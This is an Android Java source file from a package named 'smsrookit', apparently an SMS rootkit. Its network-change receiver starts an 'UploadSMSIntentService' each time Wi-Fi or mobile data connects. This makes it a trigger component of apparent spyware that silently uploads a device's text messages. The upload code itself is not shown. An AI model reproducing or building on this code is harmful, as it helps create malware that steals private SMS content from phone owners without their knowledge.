package com.funny.fortest.smsrookit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo.State;
import android.net.Uri;
import android.util.Log;
import android.widget.Toast;
import android.database.Cursor;
import java.util.ArrayList;

public class NetChangeReceiver extends BroadcastReceiver {
    public NetChangeReceiver() {
    }

    State wifiState = null;
    State mobileState = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        wifiState = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState();
        mobileState = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState();

        //Intent intent2 = new Intent(context , BroadCastActivity2_SMS.class);
        if (wifiState != null && mobileState != null && (State.CONNECTED == wifiState || State.CONNECTED == mobileState)) {
            Log.i("zhaochengyu", "onReceive: network online !");
            Intent intentService = new Intent(SMSApplication.getContext(), UploadSMSIntentService.class);
            SMSApplication.getContext().startService(intentService);

            } else {
                Log.i("zhaochengyu", "onReceive: network offline !");
            }
        }
    }

